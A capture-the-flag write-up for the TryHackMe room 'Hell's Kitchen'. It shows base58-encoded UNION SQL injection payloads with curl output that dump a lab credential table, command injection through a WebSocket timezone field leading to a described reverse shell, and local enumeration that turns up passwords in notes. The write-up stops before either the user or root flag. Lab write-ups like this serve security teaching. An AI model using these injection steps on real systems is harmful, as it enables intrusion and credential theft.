## DX2: Hell's Kitchen — TryHackMe Writeup

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/HellsKitchen.png)

**Room Description:** Can you help compromise a civilian machine that we believe is connected to the NSF?

**Room Link:** [Hell's Kitchen](https://tryhackme.com/room/dx2hellskitchen)

> *We need to recover the lost Ambrosia shipment from the NSF (National Secessionist Forces), the only treatment for the plague known as the Grey Death. However, we haven't located their main base of operations.
What we do know is some of the key figures in the organisation, and their associates: Jojo Fine, a punk who runs drugs through Hell's Kitchen, has been identified as a lieutenant in the NSF, and has one Sandra Renton, the daughter of a local hotelier for the 'Ton Hotel on his payroll.
Investigate the websites of the 'Ton Hotel and see if you can find anything that leads us to the NSF.

![image]()

---

## Objectives

* What is the Web Flag?
* What is the User Flag?
* What is the Root Flag?

---

## Summary
- **Target IP:** 10.130.191.50
- **OS:** Linux (Ubuntu)
- **Vulnerabilities:**


| Port | State | Service | Service Version / Info |
| --- | --- | --- | --- |
| **`80/tcp`** | `OPEN` | **HTTP** |  |
| **`4346/tcp`** | `OPEN` | **elanlm?** |  |
  
---

## Adding target to hosts

```bash
sudo echo -e '10.130.191.50 kitchen.thm' | sudo tee -a /etc/hosts
```

---

## Enumeration & Reconnaissance

> Port Scanning & Network Mapping: Rustscan

```
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 62
| http-methods: 
|_  Supported Methods: GET
|_http-title: Welcome to the 'Ton!
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     content-length: 859
|     date: Tue, 04 Aug 2026 11:56:51 GMT
4346/tcp open  elanlm? syn-ack ttl 62
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 408 Request Timeout
|     content-length: 0
|     connection: close
|     date: Tue, 04 Aug 2026 11:56:56 GMT
|   GetRequest: 
|     HTTP/1.0 200 OK
|     content-length: 10909
|     date: Tue, 04 Aug 2026 11:56:56 GMT
```

**About `4346` port**: 

[!] > ELANLM is an IANA-assigned service name tied to port 4346 on TCP, intended for secure communication and data exchange between devices on a local network. In practice, this is the kind of listener you are more likely to keep inside a trusted segment than expose to the internet.

[!] > That matters because anything handling device-to-device coordination or internal data exchange can become an unnecessary attack surface when it is reachable beyond the LAN. On business networks, the right question is usually whether the host and the service still belong in the workflow, not whether outside users need direct access. (SOURCE: [Port Lookup 4346](https://portlookup.com/port-4346/))

`Dashboard`:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2022-22-24.png)

`guest-book`:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2022-23-13.png)

`NYComm on port 4346`

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2022-28-38.png)

> In the main page, there were only 2 endpoints revealed. `/guest-book` for viewing staying guests, `/about-us` for about page. However, if we inspect the Network traffic while interacting, from the .js files we can identify a hidden page. Now, since the capacity is 6 rooms, and all of them are full, we cannot book any room, and alerted this message: 

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2022-22-50.png)

> I analyzed the Network traffic, and `/static/check-rooms.js`. It sends a request to `/api/rooms-available` to check if booking is less than 6, and if it's less, it sends another request to a hidden endpoint: `/new-booking`. 

```js
fetch('/api/rooms-available').then(response => response.text()).then(number => {
    const bookingBtn = document.querySelector("#booking");
    bookingBtn.removeAttribute("disabled");
    if (number < 6) {
        bookingBtn.addEventListener("click", () => {
            window.location.href = "new-booking";
        });
    } else {
        bookingBtn.addEventListener("click", () => {
            alert("Unfortunately the hotel is currently fully booked. Please try again later!")
        });
    }
});
```

> /new-booking endpoint:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2022-43-47.png)

> Analyzing traffic

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2022-46-38.png)

> It sends a GET request to `http://kitchen.thm/api/booking-info?booking_key=55oYpt6n8TAVgZajSsbj6fVQF` endpoint, appending our cookie value in the end. Now, analyzing the booking_key value, it was revealed that it was encoded in base58. Let's decode it.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2016-44-29.png)

> It's decoded to: `booking_id:8539174`. Maybe if we find a valid booking_id, we can do something here.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2022-55-12.png)

---

## SQL Injection in `?booking_id=` parameter

> There was no way the CTF expected us to brute force a billion ids, so I thought there would be an SQLi. I encoded a basic payload, and sent it. Interestingly, instead of `bad request` response, I got `not found`. Which is a sign that it might be vulnerable to SQLi.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2023-01-56.png)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2023-01-17.png)

> I did some experiment with `' ORDER BY 1-- -`, up to 4, and until 3, I got `not found`, and at `'ORDER BY 3-- -`, I got a `bad request` response.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2023-27-17.png)

> Let's try UNION injection

```bash
┌──(root㉿kali)-[~]
└─# curl -i 'http://kitchen.thm/api/booking-info?booking_key=3E4oALgFe8ZDRpLNXxoY1CiAxnUPAb4TYcJoYE54feJ1bKa'
HTTP/1.1 200 OK
content-length: 27
content-type: application/json
date: Tue, 04 Aug 2026 19:29:15 GMT

{"room_num":"1","days":"2"}
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2023-29-00.png)

> Extracting db version with: `booking_id:1' UNION SELECT sqlite_version(), 'test'-- -`

```bash
curl -i 'http://kitchen.thm/api/booking-info?booking_key=CmSErKHeAhJiWcHreuA3c11f6EGjCHtTJAaa8GjzYJY8wjRDN2yweyd6SmKbxbR2RcoDLmTwy47hXa'                                                   
HTTP/1.1 200 OK
content-length: 35
content-type: application/json
date: Tue, 04 Aug 2026 19:43:14 GMT

{"room_num":"3.42.0","days":"test"}
```


> Extracting table names with: `booking_id:1' UNION SELECT 1, group_concat(tbl_name) FROM sqlite_master WHERE type='table'-- -`

```bash
curl -i 'http://kitchen.thm/api/booking-info?booking_key=2jxBaXg1kk8jYX7ZxE5n2zjS2VTJwX6hbuBMMXnqLc8yyfa8Xycmg2e2DmxXqQB7XbB3zxyk8K6P6qhto4jHTXSYfMzmPyimofq3sskZ4jaWox9hd42n6ibtgDsQqYJTn'
HTTP/1.1 200 OK
content-length: 65
content-type: application/json
date: Tue, 04 Aug 2026 19:41:38 GMT

{"room_num":"1","days":"email_access,reservations,bookings_temp"}
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2023-29-00.png)

> Extracting column names from table 'email_access' with: `booking_id:1' UNION SELECT 1, sql FROM sqlite_master WHERE tbl_name='email_access'-- -`

```bash
 curl -i 'http://kitchen.thm/api/booking-info?booking_key=3Mk1j2Y1hq6VXa2FHSvVmufGbK5uzsBE2hjDv2Xb6XL971SPyqTWMC5kMxRYSZqCMBG13xjDfDsYYpgiQAjdA8eXaeHRvM5RVViUscxpA897fD1gqiDFPA'
HTTP/1.1 200 OK
content-length: 111
content-type: application/json
date: Tue, 04 Aug 2026 19:45:23 GMT

{"room_num":"1","days":"CREATE TABLE email_access (guest_name TEXT, email_username TEXT, email_password TEXT)"}
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2023-45-06.png)

> Okay, looks like we can get something from here, let's dump everything from this table with: `booking_id:1' UNION SELECT 1, group_concat(guest_name || ':' || email_username || ':' || email_password, '\n') FROM email_access-- -`

```bash
curl -i 'http://kitchen.thm/api/booking-info?booking_key=28uzZhxu35QQSAfpeyWEk2NXWtaUD4vnoC9KJeiNdHmTwdBzAiWATY8x8Kt5hauYYeR4dtVfcKjhz3Uxkqj7i9huNCvPqe3vbeUDT6Z17nACYndUmmwcsjMMX1fc2GU9KH8SSWanPRTDpeveYzKB8FAr3vYDEJE3HGJMpfGWX2uuAE4HnVQsn'
HTTP/1.1 200 OK
content-length: 225
content-type: application/json
date: Tue, 04 Aug 2026 19:49:50 GMT

{"room_num":"1","days":"Gully Foyle:NEVER LOGGED IN:\\nGabriel Syme:NEVER LOGGED IN:\\nOberst Enzian:NEVER LOGGED IN:\\nPaul Denton:pdenton:4321chameleon\\nSmilla Jasperson:NEVER LOGGED IN:\\nHippolyta Hall:NEVER LOGGED IN:"} 
```

---

## First Flag

> After logging in as Paul, I found the first flag inside a mail from Reyes.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-04%2023-51-14.png)

> I also found this js script which revealed another endpoint - `/api/message?message_id`

```js
<script type = "text/javascript" >
    let elems = document.querySelectorAll(".email_list .row");
for (var i = 0; i < elems.length; i++) {
    elems[i].addEventListener("click", (e => {
        document.querySelector(".email_list .selected").classList.remove("selected"), e.target.parentElement.classList.add("selected");
        let t = e.target.parentElement.getAttribute("data-id"),
            n = e.target.parentElement.querySelector(".col_from").innerText,
            r = e.target.parentElement.querySelector(".col_subject").innerText;
        document.querySelector("#from_header").innerText = n, document.querySelector("#subj_header").innerText = r, document.querySelector("#email_content").innerText = "", fetch("/api/message?message_id=" + t).then((e => e.text())).then((e => {
            document.querySelector("#email_content").innerText = atob(e)
        }))
    })), document.querySelector(".dialog_controls button").addEventListener("click", (e => {
        e.preventDefault(), window.location.href = "/"
    }))
}
const wsUri = `ws://${location.host}/ws`;
socket = new WebSocket(wsUri);
let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3);
</script>
```

**About WebSockets:** 

[*]> A WebSocket is a communication protocol that provides a persistent, full-duplex (two-way) connection between a web browser (client) and a server over a single TCP connection.

[*]> Unlike traditional HTTP requests—where the client must always initiate a request and wait for the server to reply—a WebSocket allows both the client and the server to send data to each other at any time without the overhead of establishing a new connection for every message.

[*]> Continuous Time Syncing: Every 1 second, the browser uses the open connection (socket.send(tz)) to tell the server what timezone the user is in.

[*]> Instant Server Delivery: The server calculates the exact formatted date/time for that timezone and instantly sends it back over the same open pipeline (socket.onmessage).


---

## Command Injection & Reverse Shell

> Aside from this, I noticed a WebSocket, where the client and server constantly exchanged data. Client sends location, and Server sends the time, which is printed later on. This happens every second. So I intercepted the request, and started changing what goes to server besides our location :).

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2000-17-06.png)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2000-17-30.png)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2000-17-49.png)

> I figured if the server calculates the time based on location, it must be executing server side commands, so it might be a command injection here. Let's try. At first, when I tried `;ls` as a standard command injection attempt, what came from server was completely empty. The response has changed, but it was nothing. So I added a second `;` after the injected command `ls`, and whatever was after the command stopped messing with ours, thus succeeding.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2001-17-48.png)

> Unfortunately, I still could not get most RCE attempts to work. Either the syntax broke, or it failed to execute due to some characters. So I created an index.html which would be the default file to be curled without file name specified over port 80. All I needed to do was placing a reverse shell command inside the index.html file, and fetch it via websocket and get it to execute whatever is inside. However, one thing should be considered. Not all ports are open in the target machine, so we need to choose a common port which is open almost in all servers - 443. Fetching the payload using port 80, and getting a rev shell on port 443.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2010-37-00.png)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2001-47-54.png)

> Executing the fetched content

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2001-54-17.png)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2001-47-32.png)

---

## Initial Foothold & Local Enumeration

> dad.txt

```bash
gilbert@tonhotel:~$ cat dad.txt 
left you a note by the site -S
```

> hotel-jobs.txt

```bash
gilbert@tonhotel:~$ cat hotel-jobs.txt 
hotel tasks, q1 52

- fix lights in the elevator shaft, flickering for a while now
- maybe put barrier up in front of shaft, so the addicts dont fall in
- ask sandra AGAIN why that punk has an account on here (be nice, so good for her to be home helping with admin)
- remember! 'ilovemydaughter'

buy her something special maybe - she used to like raspberry candy - as thanks for locking the machine down. 'ports are blocked' whatever that means. my smart girl

```

> Enumerating files and directories that Sandra owns, or can rw

```bash
gilbert@tonhotel:~$ find / -user sandra 2>/dev/null
/home/sandra
/home/sandra/user.txt
/home/sandra/.profile
/home/sandra/.bash_history
/home/sandra/note.txt
/home/sandra/Pictures
/home/sandra/.bashrc
/home/sandra/.bash_logout
/home/gilbert/dad.txt
/srv/.dad

gilbert@tonhotel:~$ ls -la /srv
total 6080
drwxr-xr-x  2 root   root       4096 Jul 19  2024 .
drwxr-xr-x 19 root   root       4096 Oct 22  2022 ..
-rw-r-----  1 sandra gilbert     183 Sep 10  2023 .dad
-rwx--x---  1 root   gilbert 3234904 Jul 19  2024 nycomm_link_v7895
-rwx------  1 root   root    2976128 Sep  9  2023 tonhotel

gilbert@tonhotel:~$ cat /srv/.dad
i cant deal with your attacks on my friends rn dad, i need to take some time away from the hotel. if you need access to the ton site, my pw is where id rather be: anywherebuthere. -S
```

> I can only execute this file which listens on port 3000

```shell
gilbert@tonhotel:/srv$ ./nycomm_link_v7895 
no bind specified, defaulting
listening on 0.0.0.0:3000
```

> Then I thought I can fetch the contents, and it was just nycomm login page

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2011-04-57.png)

